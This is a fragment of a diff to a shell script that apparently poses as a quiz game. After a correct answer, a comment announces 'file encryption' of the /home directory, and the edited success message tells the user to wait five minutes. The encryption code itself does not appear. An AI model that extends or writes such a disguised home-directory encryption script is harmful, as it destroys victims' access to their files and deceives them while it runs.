@@ -18,7 +18,7 @@ if [ "$user_answer" != "$correct_answer" ]; then
     exit 1
 fi
 
-echo "Correct! Access granted. Please wait for the next game."
+echo "Correct! Access granted. Please wait for the next game. It takes 5 minutes."
 
 # Continue with file encryption
 folder_to_encrypt="/home"
